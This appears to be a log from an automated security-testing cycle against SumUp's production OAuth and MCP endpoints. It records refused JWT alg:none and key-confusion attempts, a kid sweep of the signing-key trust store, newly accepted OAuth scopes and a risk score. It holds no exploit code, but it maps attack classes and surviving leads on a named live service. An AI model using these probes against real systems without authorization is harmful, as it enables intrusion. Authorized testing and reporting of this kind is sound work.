+[LEARN] REJECTED AUTH @ mcp.sumup.com/mcp: JWT `alg:none` and RS256→HS256 key confusion are both explicitly refused by the **production** bearer verifier — `{"error":"invalid_token","error_description":"Unsupported \"alg\" value for a JSON Web Key Set"}` for both — and the allowlist is exactly `{RS256, EdDSA}` (RS384/RS512/PS256/ES256 → `no applicable key`). 29 cycles had never run the JWT-confusion class against a prod asset; it is now closed with a reproducible 6-value matrix rather than assumed. The surviving prod weakness is strictly narrower: `kid` is optional (RFC 8725 §3.11 try-all), which is a hardening deviation, not a bypass.
+[LEARN] ACCEPTED OTHER @ mcp.sumup.com: RFC 9728 resource-server metadata is LIVE on the prod MCP host at two paths and publishes a `scopes_supported:["offline_access","email"]` model plus `resource_documentation: https://developer.sumup.com/tools/llms` — none of it in the KB, which had only probed the MCP app-directory file `/.well-known/mcp.json` and recorded its 404. A 404 on one `.well-known` path is not evidence the spec surface is absent.
+[LEARN] ACCEPTED OATH @ auth.sumup.com: `client_id=dashboard` ACCEPTS `email` (302 `login_challenge`), completing its consent set as `{openid, classic, offline, readers.read, terminals.read, email}` while `offline_access` is rejected (303 `invalid_scope`) — the KB's "readers.read/terminals.read are the ONLY scopes" was a measurement gap, and `email` is precisely one of the two scopes the prod MCP server declares it needs.
+[LEARN] REJECTED AUTH @ auth.sam-app.ro/oauth2-register/JWKS: a 30-candidate `kid` sweep against the prod MCP verifier found exactly the 8 published prod kids trusted and **0** undeclared — no stale, rotated-but-trusted, or rogue signing key in the prod trust store, and the staging `loadtesting` key is absent from prod. The key-lifecycle-drift hypothesis class is closed for this asset.
+[LEARN] ACCEPTED OTHER @ auth.sam-app.ro JWKS: the staging trust set contains **2 duplicated entries** (`public:3a13954d-…`, `public:f06a4960-…` each twice) — 11 entries, 9 unique keys. Any kid-set size quoted from an entry count overstates the real key count and would corrupt a cross-environment overlap argument.
+
+## STEP 7 — RISK
+
+[RISK] sumup: 40. This cycle broke a 27-cycle no-delta streak with the first prod-side, non-banner, non-CORS observation the program has produced: a documented prod OAuth resource-server scope model (`mcp.sumup.com` RFC 9728), a newly measured scope in the stock `dashboard` client that satisfies half of it, and a 4-class prod kid/alg oracle. It also closed two long-open classes with evidence rather than assumption — JWT alg/key confusion on prod is explicitly refused, and the prod trust store contains no undeclared key. Residual risk is unchanged and dominated by credentials, not by surface: 3 of 4 surviving leads are AUTH_HELPED behind a merchant bearer, and the one complete PASSIVE deliverable (auth.sam-app.ro, VALID 7.5) is unsubmitted for the 15th cycle. No chainable exploit was achieved, so program risk stays low while discovery efficiency finally turns positive.
